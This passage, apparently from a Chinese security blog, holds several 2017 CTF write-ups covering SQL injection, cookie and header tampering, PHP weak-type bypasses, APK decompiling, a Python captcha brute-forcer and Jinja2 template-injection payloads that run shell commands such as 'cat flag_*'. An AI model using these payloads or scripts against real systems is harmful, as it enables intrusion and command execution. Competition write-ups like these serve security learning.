title="第二关:提交方式是怎么样的啊？"></a>第二关:提交方式是怎么样的啊？</h2><p>pass !<br>一样<br><img src="/img/webug3/17.png" alt=""></p><h2 id="第三关-我还是一个注入"><a href="#第三关-我还是一个注入" class="headerlink" title="第三关:我还是一个注入"></a>第三关:我还是一个注入</h2><p>怎么又TM注入？<br>有一个header注入<br><img src="/img/webug3/18.png" alt=""></p><h2 id="第四关-APK里面有一个flag"><a href="#第四关-APK里面有一个flag" class="headerlink" title="第四关:APK里面有一个flag"></a>第四关:APK里面有一个flag</h2><p>看看apk</p><ul><li><p>apktool 作用：资源文件获取，可以提取出图片文件和布局文件进行使用查看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apktool d -f [apk文件 ] -o [输出文件夹]</span><br><span class="line">apktool d -f test.apk -o test    </span><br><span class="line">重新打包成apk</span><br><span class="line">apktool b test</span><br></pre></td></tr></table></figure></li><li><p>dex2jar 作用：将apk反编译成java源码（classes.dex转化成jar文件）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">windows</span><br><span class="line">.\dex2jar-2.0\d2j-dex2jar.bat .\output\test\classes.dex</span><br><span class="line">linux</span><br><span class="line">dex2jar classes.dex</span><br></pre></td></tr></table></figure></li><li><p>jd-gui 作用：查看APK中classes.dex转化成出的jar文件，即源码文件<br>直接用这个工具打开classes-dex2jar.jar</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(Base64.decode(&quot;YWZlOGU5MWI=&quot;, &quot;UTF-8&quot;))).append(Base64.decode(&quot;NGM1NGFkOGVi&quot;, &quot;UTF-8&quot;)).toString())).append(Base64.decode(&quot;MzA0M2UzNjY=&quot;, &quot;UTF-8&quot;)).toString() + Base64.decode(&quot;ZGJjYTA1Zg==&quot;, &quot;UTF-8&quot;);</span><br></pre></td></tr></table></figure></li></ul><p>看到代码了，base64-decode一下<br>afe8e91b4c54ad8eb4c54ad8eb3043e366dbca05f</p><h2 id="第五关-时间注入"><a href="#第五关-时间注入" class="headerlink" title="第五关:时间注入"></a>第五关:时间注入</h2><p>时间注入<br>时间盲注<br><img src="/img/webug3/19.png" alt=""></p><h2 id="实战练习-DZ论坛"><a href="#实战练习-DZ论坛" class="headerlink" title="实战练习:DZ论坛"></a>实战练习:DZ论坛</h2><p>注入<br>实战题~好像搭建的不怎么OK，先不做</p><h2 id="实战练习-aspcms"><a href="#实战练习-aspcms" class="headerlink" title="实战练习:aspcms"></a>实战练习:aspcms</h2><p>注入</p><h2 id="实战练习-phpmyadmin"><a href="#实战练习-phpmyadmin" class="headerlink" title="实战练习:phpmyadmin"></a>实战练习:phpmyadmin</h2><p>任意文件包含漏洞</p><h2 id="实战练习-齐博系统"><a href="#实战练习-齐博系统" class="headerlink" title="实战练习:齐博系统"></a>实战练习:齐博系统</h2><p>SQL注入</p><h2 id="实战练习-海盗云商"><a href="#实战练习-海盗云商" class="headerlink" title="实战练习:海盗云商"></a>实战练习:海盗云商</h2><p>getshell</p><h2 id="实战练习-PHP168-6-0"><a href="#实战练习-PHP168-6-0" class="headerlink" title="实战练习:PHP168 6.0"></a>实战练习:PHP168 6.0</h2><p>任意代码执行GET SHELL</p><h2 id="实战练习-ecshop"><a href="#实战练习-ecshop" class="headerlink" title="实战练习:ecshop"></a>实战练习:ecshop</h2><p>/admin/shopinfo.php SQL注入</p><h2 id="实战练习-ShopXp系统v3-x"><a href="#实战练习-ShopXp系统v3-x" class="headerlink" title="实战练习:ShopXp系统v3.x"></a>实战练习:ShopXp系统v3.x</h2><p>SQL注射漏洞</p><h2 id="实战练习-Dcore-轻型CMS系统"><a href="#实战练习-Dcore-轻型CMS系统" class="headerlink" title="实战练习:Dcore(轻型CMS系统)"></a>实战练习:Dcore(轻型CMS系统)</h2><p>注入漏洞</p><h2 id="实战练习-MetInfo-5-1-7"><a href="#实战练习-MetInfo-5-1-7" class="headerlink" title="实战练习:MetInfo 5.1.7"></a>实战练习:MetInfo 5.1.7</h2><p>任意文件包含漏洞可getshell</p><h2 id="实战练习-Metinfo-5-3"><a href="#实战练习-Metinfo-5-3" class="headerlink" title="实战练习:Metinfo 5.3"></a>实战练习:Metinfo 5.3</h2><p>news.php盲注</p><h1 id="实战拓展"><a href="#实战拓展" class="headerlink" title="实战拓展"></a>实战拓展</h1><h2 id="实战练习-Metinfo5-3"><a href="#实战练习-Metinfo5-3" class="headerlink" title="实战练习:Metinfo5.3"></a>实战练习:Metinfo5.3</h2><p>img.php盲注</p><h2 id="实战练习-万众电子期刊在线阅读系统PHP和ASP"><a href="#实战练习-万众电子期刊在线阅读系统PHP和ASP" class="headerlink" title="实战练习:万众电子期刊在线阅读系统PHP和ASP"></a>实战练习:万众电子期刊在线阅读系统PHP和ASP</h2><p>SQL注入</p><h2 id="实战练习-BEESCMS"><a href="#实战练习-BEESCMS" class="headerlink" title="实战练习:BEESCMS"></a>实战练习:BEESCMS</h2><p>sql注入</p><h2 id="实战练习-ourphpV1-3-1"><a href="#实战练习-ourphpV1-3-1" class="headerlink" title="实战练习:ourphpV1.3.1"></a>实战练习:ourphpV1.3.1</h2><p>注入</p><h2 id="实战练习-phpwind"><a href="#实战练习-phpwind" class="headerlink" title="实战练习:phpwind"></a>实战练习:phpwind</h2><p>版本命令执行漏洞</p><h2 id="实战练习-metinfo-5-1以下"><a href="#实战练习-metinfo-5-1以下" class="headerlink" title="实战练习:metinfo 5.1以下"></a>实战练习:metinfo 5.1以下</h2><p>任意用户密码修改</p><h2 id="实战练习-DZ3-2"><a href="#实战练习-DZ3-2" class="headerlink" title="实战练习:DZ3.2"></a>实战练习:DZ3.2</h2><p>存储型跨站</p><h2 id="实战练习-DedeCMS"><a href="#实战练习-DedeCMS" class="headerlink" title="实战练习:DedeCMS"></a>实战练习:DedeCMS</h2><p>flink.php友情链接注入</p><h2 id="实战练习-DedeCms"><a href="#实战练习-DedeCms" class="headerlink" title="实战练习:DedeCms"></a>实战练习:DedeCms</h2><p>recommend.php注入</p><h2 id="实战练习-BEESCMS-1"><a href="#实战练习-BEESCMS-1" class="headerlink" title="实战练习:BEESCMS"></a>实战练习:BEESCMS</h2><p>注入</p><h2 id="实战练习-海洋cms"><a href="#实战练习-海洋cms" class="headerlink" title="实战练习:海洋cms"></a>实战练习:海洋cms</h2><p>头部注入</p><h2 id="实战练习-CVE-2006-7243"><a href="#实战练习-CVE-2006-7243" class="headerlink" title="实战练习:CVE-2006-7243"></a>实战练习:CVE-2006-7243</h2><p>php截断利用</p><h2 id="实战练习-CVE-2013-3660"><a href="#实战练习-CVE-2013-3660" class="headerlink" title="实战练习:CVE-2013-3660"></a>实战练习:CVE-2013-3660</h2><p>本地提权</p><h2 id="实战练习-IIS-6-0"><a href="#实战练习-IIS-6-0" class="headerlink" title="实战练习:IIS 6.0"></a>实战练习:IIS 6.0</h2><p>远程命令执行</p><h2 id="实战练习-HFS"><a href="#实战练习-HFS" class="headerlink" title="实战练习:HFS"></a>实战练习:HFS</h2><p>第三方软件提权</p><h2 id="实战练习-MYsql"><a href="#实战练习-MYsql" class="headerlink" title="实战练习:MYsql"></a>实战练习:MYsql</h2><p>数据库提权</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>强网杯-ctf-2017</title>
      <link href="//blog/2017/%E5%BC%BA%E7%BD%91%E6%9D%AF-ctf-2017.html"/>
      <url>//blog/2017/%E5%BC%BA%E7%BD%91%E6%9D%AF-ctf-2017.html</url>
      
        <content type="html"><![CDATA[<h1 id="broken"><a href="#broken" class="headerlink" title="broken"></a>broken</h1><p><img src="/img/qwb/1.png" alt=""><br>Jsfuck<br>直接console中跑发现报错<br><img src="/img/qwb/2.png" alt=""><br>后面加个]<br><img src="/img/qwb/3.png" alt=""></p><p>看到最后面的()，应该是函数调用，去掉<br><img src="/img/qwb/4.png" alt=""></p><h1 id="who-are-you"><a href="#who-are-you" class="headerlink" title="who are you?"></a>who are you?</h1><p><img src="/img/qwb/5.png" alt=""><br>设置cookie<br><img src="/img/qwb/6.png" alt=""><br>还是没有权限，从cookie入手，base64解码<br><img src="/img/qwb/7.png" alt=""><br>thrfg怎么看都没意义，后来想到rot13<br><img src="/img/qwb/8.png" alt=""><br>嗯，改guest为admin，rot13-&gt;base64<br><img src="/img/qwb/9.png" alt=""><br><img src="/img/qwb/10.png" alt=""><br>用post上传，指定filename和data。<br>尝试上传php木马，发现会检测左尖括号。<br><img src="/img/qwb/11.png" alt=""><br>尝试绕过无果，后来想到检测左尖括号可能可以用数组绕过<br><img src="/img/qwb/12.png" alt=""><br>直接给flag<br><img src="/img/qwb/13.png" alt=""></p><h1 id="phone-number"><a href="#phone-number" class="headerlink" title="phone number"></a>phone number</h1><p>逻辑就是注册账号包括手机号信息，登录，check有多少个具有相同手机号的账号。<br>看到check页面中，<br><img src="/img/qwb/14.png" alt=""><br>admin的电话藏有大秘密。<br>尝试账号密码注入失败，结合题目，应该是通过手机号注入的。<br>提交一般字符串，提示<br><img src="/img/qwb/15.png" alt=""><br>，后面发现提交0e科学计数法和0x的hex编码可以绕过，insert点在注册的手机号这里，<br>输出点在check页面，可以insert注入。<br><img src="/img/qwb/16.png" alt=""><br><img src="/img/qwb/17.png" alt=""><br>而且是union注入。<br><img src="/img/qwb/18.png" alt=""><br><img src="/img/qwb/19.png" alt=""><br>数据库名webdb<br><img src="/img/qwb/20.png" alt=""><br><img src="/img/qwb/21.png" alt=""><br>表名为user<br><img src="/img/qwb/22.png" alt=""><br><img src="/img/qwb/23.png" alt=""><br>发现没有返回列名，然后看到<br><img src="/img/qwb/24.png" alt=""><br>原来长度有限制，简化下<br><img src="/img/qwb/25.png" alt=""><br><img src="/img/qwb/26.png" alt=""><br>得到列名id，username，phone，password<br><img src="/img/qwb/27.png" alt=""><br>拿数据，得flag.</p><h1 id="Musee-de-X"><a href="#Musee-de-X" class="headerlink" title="Musee de X"></a>Musee de X</h1><p>scimg.jb51.net/allimg/150811/14-150Q1142KAF.jpg<br>报错信息中发现有jinja2<br><img src="/img/qwb/28.png" alt=""><br>直接搜索python SSTI找到<br><img src="/img/qwb/29.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&apos;&apos;.\_\_class\_\_.\_\_mro\_\_[2].\_\_subclasses\_\_()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/qwb/30.png" alt=""><br>这水印输出字符长度有限制。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&apos;&apos;.\_\_class\_\_.\_\_mro\_\_[2].\_\_subclasses\_\_()[59]&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/qwb/31.png" alt=""><br>找到catch_warnings类了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&apos;&apos;.\_\_class\_\_.\_\_mro\_\_[2].\_\_subclasses\_\_()[59] .\_\_init\_\_.func\_globals[&apos;linecache&apos;].\_\_dict\_\_[&apos;o&apos;+&apos;s&apos;].\_\_dict\_\_[&apos;pop&apos;+&apos;en&apos;](&apos;ls&apos;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/qwb/32.png" alt=""><br>发现flag文件，已经发现水印输出中过滤了一些字符，可以猜测flag文件名为flag_8d294abea9f0，额，不用猜直接flag*。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&apos;&apos;.\_\_class\_\_.\_\_mro\_\_[2].\_\_subclasses\_\_()[59] .\_\_init\_\_.func\_globals[&apos;linecache&apos;].\_\_dict\_\_[&apos;o&apos;+&apos;s&apos;].\_\_dict\_\_[&apos;pop&apos;+&apos;en&apos;](&apos;cat flag\_\*&apos;).read()&#125;&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/img/qwb/33.png" alt=""><br>额，看不全，找张大图<br><a href="http://pic1.win4000.com/wallpaper/d/58c0f570b231b.jpg" target="_blank" rel="noopener">http://pic1.win4000.com/wallpaper/d/58c0f570b231b.jpg</a><br><img src="/img/qwb/34.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;06015a4f-8d29-4abe-a9f0-e1cb18911671&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>gctf-ctf-2017</title>
      <link href="//blog/2017/gctf-ctf-2017.html"/>
      <url>//blog/2017/gctf-ctf-2017.html</url>
      
        <content type="html"><![CDATA[<h1 id="2017-首届全球华人网络安全技能大赛"><a href="#2017-首届全球华人网络安全技能大赛" class="headerlink" title="2017 首届全球华人网络安全技能大赛"></a>2017 首届全球华人网络安全技能大赛</h1><h2 id="热身题"><a href="#热身题" class="headerlink" title="热身题"></a>热身题</h2><p><img src="/img/gctf/1.png" alt=""><br>检查了下robots.txt，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># robots.txt for Topsec CTF</span><br><span class="line">#</span><br><span class="line">User-agent: *</span><br><span class="line">Disallow: /caches</span><br><span class="line">Disallow: /phpcms/config.txt</span><br><span class="line">Disallow: /install</span><br><span class="line">Disallow: /phpsso_server</span><br><span class="line">Disallow: /api.txt</span><br><span class="line">Disallow: /Admin.aspx</span><br><span class="line">Disallow: /te1t.txt</span><br><span class="line">Disallow: /dede</span><br><span class="line">Disallow: /m3mber</span><br><span class="line">Disallow: /setup</span><br><span class="line">Disallow: /uping</span><br><span class="line">Disallow: /templets</span><br><span class="line">Disallow: /default</span><br><span class="line">Disallow: /index.html</span><br><span class="line">Disallow: /js.txt</span><br><span class="line">Disallow: /login.php</span><br><span class="line">Disallow: /rob0t.php</span><br><span class="line">Disallow: /admin.php</span><br><span class="line">Disallow: /1ndex.txt</span><br><span class="line">Disallow: /freelist</span><br><span class="line">Disallow: /html</span><br><span class="line">Disallow: /include</span><br></pre></td></tr></table></figure><p>尝试直到发现/rob0t.php</p><p>———————–Congratulation!—————————<br>GCTF{ae609880185f1d75}</p><h2 id="变态验证码"><a href="#变态验证码" class="headerlink" title="变态验证码"></a>变态验证码</h2><p>搜了一下几种绕验证码的方式，都试了一下，发现只要第一次输对了验证码，后面直接把验证码设为空串就行了，然后用Burp和他给的password.txt爆破一下就行了</p><h2 id="Forbidden"><a href="#Forbidden" class="headerlink" title="Forbidden"></a>Forbidden</h2><p><img src="/img/gctf/2.png" alt=""></p><p>查看网页源代码，发现注释</p><p>X-Forwarded-For:localhost</p><p>又发现提示了www.topsec.com</p><blockquote><p>Host: www.topsec.com</p></blockquote><p>Referer: <a href="http://www.baidu.com" target="_blank" rel="noopener">http://www.baidu.com</a></p><p>模拟ajax请求头</p><blockquote><p>X-Requested-With:XMLHttpRequest</p></blockquote><p>User-Agent 添加</p><blockquote><p>MSIE 4;</p></blockquote><p>User-Agent 添加</p><blockquote><p>.NET CLR 8;</p></blockquote><p>修改下Accept-Language</p><blockquote><p>Accept-Language: de-DE,de;</p></blockquote><p>这里比较考脑洞了，看到response中有Set-Cookie : login=4e6a59324d545a6a4e7a4d324e513d3d</p><p>但是添加这个并没用。充分审题“没有登录”，又想不到什么办法，对login值进行decode</p><p><img src="/img/gctf/3.png" alt=""></p><blockquote><p>4e6a59324d545a6a4e7a4d324e513d3d ———ASCII2Hex—-&gt;</p></blockquote><p>NjY2MTZjNzM2NQ== —————Base64——&gt;</p><p>66616c7365 ————–ASCII2Hex-&gt;</p><p>false</p><p>false 改成 true，反过来encode，得“4e7a51334d6a63314e6a553d”，再提交即可得flag。</p><p>最终<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: www.topsec.com</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; .NET CLR 8;MSIE 4; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8</span><br><span class="line">Accept-Language: de-DE,de;q=0.5</span><br><span class="line">Referer: http://www.baidu.com</span><br><span class="line">X-Forwarded-For:localhost</span><br><span class="line">X-Requested-With:XMLHttpRequest</span><br><span class="line">Cookie: lang=english; 8760CE88=1;login=4e7a51334d6a63314e6a553d</span><br><span class="line">Connection: close</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>世安杯-ctf-2017</title>
      <link href="//blog/2017/%E4%B8%96%E5%AE%89%E6%9D%AF-ctf-2017.html"/>
      <url>//blog/2017/%E4%B8%96%E5%AE%89%E6%9D%AF-ctf-2017.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-ctf-入门级题目"><a href="#1-ctf-入门级题目" class="headerlink" title="1. ctf 入门级题目"></a>1. ctf 入门级题目</h1><p>下源代码，发现可以利用ereg的00截断漏洞，burpsuite发送get请求/shian-rao/?password=1%00–</p><p><img src="/img/shianbei/1.png" alt=""></p><h1 id="2-曲奇饼"><a href="#2-曲奇饼" class="headerlink" title="2. 曲奇饼"></a>2. 曲奇饼</h1><p>访问，一段不知名文字，然后发现网址/shian-quqi/index.php?line=&amp;file=a2V5LnR4dA==</p><p>file参数明显base64编码过，base64解码为key.txt，然后我们修改为index.php，base64编码，加上line参数可以遍历index.php文件。得到源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$file=base64_decode(isset($_GET[&apos;file&apos;])?$_GET[&apos;file&apos;]:&quot;&quot;);</span><br><span class="line">$line=isset($_GET[&apos;line&apos;])?intval($_GET[&apos;line&apos;]):0;</span><br><span class="line">if($file==&apos;&apos;) header(&quot;location:index.php?line=&amp;file=a2V5LnR4dA==&quot;);</span><br><span class="line">$file_list = array(</span><br><span class="line">&apos;0&apos; =&gt;&apos;key.txt&apos;,</span><br><span class="line">&apos;1&apos; =&gt;&apos;index.php&apos;,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">if(isset($_COOKIE[&apos;key&apos;]) &amp;&amp; $_COOKIE[&apos;key&apos;]==&apos;li_lr_480&apos;)&#123;</span><br><span class="line">$file_list[2]=&apos;thisis_flag.php&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(in_array($file, $file_list))&#123;</span><br><span class="line">$fa = file($file);</span><br><span class="line">echo $fa[$line];</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>容易发现只要将file参数值改为thisis_flag.php的base64编码后的值，并且添加cookie</p><p><img src="/img/shianbei/2.png" alt=""></p><h1 id="3-类型"><a href="#3-类型" class="headerlink" title="3. 类型"></a>3. 类型</h1><p>直接给了源码，通过php的弱类型漏洞绕过就好。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">$a=0;</span><br><span class="line">$b=0;</span><br><span class="line">$c=0;</span><br><span class="line">$d=0;</span><br><span class="line">if (isset($_GET[&apos;x1&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">        $x1 = $_GET[&apos;x1&apos;];</span><br><span class="line">        $x1==&quot;1&quot;?die(&quot;ha?&quot;):NULL;</span><br><span class="line">        switch ($x1)</span><br><span class="line">        &#123;</span><br><span class="line">        case 0:</span><br><span class="line">        case 1:</span><br><span class="line">                $a=1;</span><br><span class="line">                break;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">$x2=(array)json_decode(@$_GET[&apos;x2&apos;]);</span><br><span class="line">if(is_array($x2))&#123;</span><br><span class="line">    is_numeric(@$x2[&quot;x21&quot;])?die(&quot;ha?&quot;):NULL;</span><br><span class="line">    if(@$x2[&quot;x21&quot;])&#123;</span><br><span class="line">        ($x2[&quot;x21&quot;]&gt;2017)?$b=1:NULL;</span><br><span class="line">    &#125;</span><br><span class="line">    if(is_array(@$x2[&quot;x22&quot;]))&#123;</span><br><span class="line">        if(count($x2[&quot;x22&quot;])!==2 OR !is_array($x2[&quot;x22&quot;][0])) die(&quot;ha?&quot;);</span><br><span class="line">        $p = array_search(&quot;XIPU&quot;, $x2[&quot;x22&quot;]);</span><br><span class="line">        $p===false?die(&quot;ha?&quot;):NULL;</span><br><span class="line">        foreach($x2[&quot;x22&quot;] as $key=&gt;$val)&#123;</span><br><span class="line">            $val===&quot;XIPU&quot;?die(&quot;ha?&quot;):NULL;</span><br><span class="line">        &#125;</span><br><span class="line">        $c=1;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$x3 = $_GET[&apos;x3&apos;];</span><br><span class="line">if ($x3 != &apos;15562&apos;) &#123;</span><br><span class="line">    if (strstr($x3, &apos;XIPU&apos;)) &#123;</span><br><span class="line">        if (substr(md5($x3),8,16) == substr(md5(&apos;15562&apos;),8,16)) &#123;</span><br><span class="line">            $d=1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if($a &amp;&amp; $b &amp;&amp; $c &amp;&amp; $d)&#123;</span><br><span class="line">    include &quot;flag.php&quot;;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p><code>==</code>弱类型，则<code>x1=b</code>，<br><code>is_numeric</code> 直接用2018bcd绕过，后面比较的时候转换为数值2018，得<code>b1=1</code><br><code>array_search</code>弱类型漏洞，<code>XIPU</code>字符串转数字为0，然后后面的<code>$var===&quot;XIPU&quot;</code>由于会检查类型，所以可以绕过<br>所以可以构造<code>x2={“x21”:”2018a”,”x22”:[[0,1],0]}</code><br>后面的md5直接爆破即可，<code>x3=XIPU18570</code></p><p><img src="/img/shianbei/3.png" alt=""></p><h1 id="4-登录"><a href="#4-登录" class="headerlink" title="4. 登录"></a>4. 登录</h1><p>用户名默认了，密码看网页源代码有提示说为5位数字，验证码是非图片验证码，直接可以拿到<br>所以，爆破吧，生成一个00000-99999的字典，一个get拿到验证码，然后一个get测试一个密码，然后，建议开个多线程。<br>这里直接利用工具了，pkav HHTP Fuzzer<br><img src="/img/shianbei/6.png" alt=""></p><p>或者 脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">import urllib, urllib2</span><br><span class="line">import re</span><br><span class="line">import threading</span><br><span class="line">def get(begin):</span><br><span class="line">right = 0</span><br><span class="line">index = begin * 10000</span><br><span class="line">while index &lt; (begin + 1) * 10000:</span><br><span class="line">URL = &apos;http://ctf1.shiyanbar.com/shian-s/index.php&apos;;</span><br><span class="line">opener = urllib2.build_opener()</span><br><span class="line">opener.addheaders.append((&apos;Cookie&apos;, &apos;PHPSESSID=45cehecb1jv2jlsi591hv8l0m&apos; + str(begin)))</span><br><span class="line">try:</span><br><span class="line">response = opener.open(URL)</span><br><span class="line">except urllib2.HTTPError, e:</span><br><span class="line">continue</span><br><span class="line">data = response.read()</span><br><span class="line">if re.search(&apos;服务器安全狗防护验证页面&apos;, data) != None:</span><br><span class="line">continue</span><br><span class="line">if re.search(&apos;&lt;br&gt;&lt;br&gt;[0-9]*&lt;br&gt;&lt;br&gt;&apos;, data) == None:</span><br><span class="line">continue</span><br><span class="line">rcode = re.search(&apos;&lt;br&gt;&lt;br&gt;[0-9]*&lt;br&gt;&lt;br&gt;&apos;, data).group()</span><br><span class="line">rcode = rcode[8:11]</span><br><span class="line"># print(index)</span><br><span class="line">s = str(index)</span><br><span class="line">if index &lt; 10000:</span><br><span class="line">s = s.zfill(5)</span><br><span class="line">password = s</span><br><span class="line">formdata = &#123;&apos;username&apos;: &apos;admin&apos;, &apos;password&apos;:password, &apos;randcode&apos;:rcode&#125;</span><br><span class="line">data_encoded = urllib.urlencode(formdata)</span><br><span class="line"># req = urllib2.Request(URL, param)</span><br><span class="line">URL += &apos;?&apos; + data_encoded</span><br><span class="line"># print(URL)</span><br><span class="line"># opener = urllib2.build_opener()</span><br><span class="line">opener.addheaders.append((&apos;Cookie&apos;, &apos;PHPSESSID=45cehecb1jv2jlsi591hv8l0m&apos; + str(begin)))</span><br><span class="line">try:</span><br><span class="line">response1 = opener.open(URL)</span><br><span class="line">status = response1.getcode()</span><br><span class="line"># print(status == 200)</span><br><span class="line">except urllib2.HTTPError, e:</span><br><span class="line">continue</span><br><span class="line"></span><br><span class="line">f1 = open(&apos;log&apos; + str(begin) + &apos;.txt&apos;, &apos;a&apos;)</span><br><span class="line">f1.write(str(index) + &quot;\n&quot;)</span><br><span class="line">f1.close()</span><br><span class="line">data1 = response1.read()</span><br><span class="line">if re.search(&apos;服务器安全狗防护验证页面&apos;, data1) != None:</span><br><span class="line">continue</span><br><span class="line"># print(re.search(&apos;验证码错误&apos;, data1))</span><br><span class="line"># print(right)</span><br><span class="line">if status == 200 and 